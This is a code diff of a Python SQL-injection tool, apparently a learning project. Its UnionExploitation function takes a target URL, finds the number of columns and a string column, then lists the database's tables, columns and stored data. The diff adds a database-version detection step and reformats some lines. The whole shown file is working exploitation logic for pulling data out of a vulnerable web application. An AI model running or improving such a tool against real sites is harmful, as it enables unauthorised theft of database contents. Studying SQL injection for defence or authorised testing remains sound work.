@@ -1,6 +1,8 @@
 import requests
 import re
 import UnionScripts
+
+
 # Our main work depend on fn called UnionExploitation :
 # his work can divided into TWO Main steps
 
@@ -19,7 +21,6 @@ import UnionScripts
 
 #         <-- MAIN FUNCTION -->
 def UnionExploitation(url, error_massage):
-
     # this is (a-1) step it determined the number of columns using 'ORDER BY' Clause
     print("[*] Figure out number of columns ...")
     columns_no = 0
@@ -43,10 +44,18 @@ def UnionExploitation(url, error_massage):
         if string_column:
             print("[+] column {} it's data type is string, verify by payload: {}".format(string_column, sql_payload))
 
+            # figure out DB version
+            DB_version = UnionScripts.figure_DB_version(url, sql_payload)
+            if DB_version is not None:
+                print("your DB version : {} ".format(DB_version.group(0)))
+            else:
+                print("Can't detect DB version")
+
             # now we started the funny part of this process by starting enumerate data in DB
             # now at (a-2) step we will enumerate tables that exist in this DB
             DB_tables = UnionScripts.figure_tables_in_DB(url, sql_payload)
-            print("[+] Exploiting {} tables, this is names of this table, insert one to find it's columns ".format(len(DB_tables)))
+            print("[+] Exploiting {} tables, this is names of this table, insert one to find it's columns ".format(
+                len(DB_tables)))
             for i in DB_tables:
                 print("#{}: {}".format(list(DB_tables).index(i), i))
             table_name = input("Insert table name: ")
@@ -56,7 +65,8 @@ def UnionExploitation(url, error_massage):
             # now at step (b-2) and we have the name of table that the user want to enumerate its columns
             else:
                 DB_columns = UnionScripts.figure_columns_in_table(url, sql_payload, table_name)
-                print("[+] Exploiting {} columns, this is names of this columns, insert one to show his data".format(len(DB_columns)))
+                print("[+] Exploiting {} columns, this is names of this columns, insert one to show his data".format(
+                    len(DB_columns)))
                 for i in DB_columns:
                     print("#{}: {}".format(list(DB_columns).index(i), i))
                 column_name = input("Insert column: ")
@@ -71,8 +81,8 @@ def UnionExploitation(url, error_massage):
                         column_name = column_name + '|| \' @ \' ||' + column
                         flag = input("to insert another column 1 or 0 to exit: ")
 
-            # FINALLY, at last step (c-2) step in this step all data within selected tables and columns
-            # we displayed on user's screen
+                    # FINALLY, at last step (c-2) step in this step all data within selected tables and columns
+                    # we displayed on user's screen
                     UnionScripts.figure_data_in_columns(url, sql_payload, table_name, column_name)
         else:
             print("[-] There is no exist columns has string as data type")
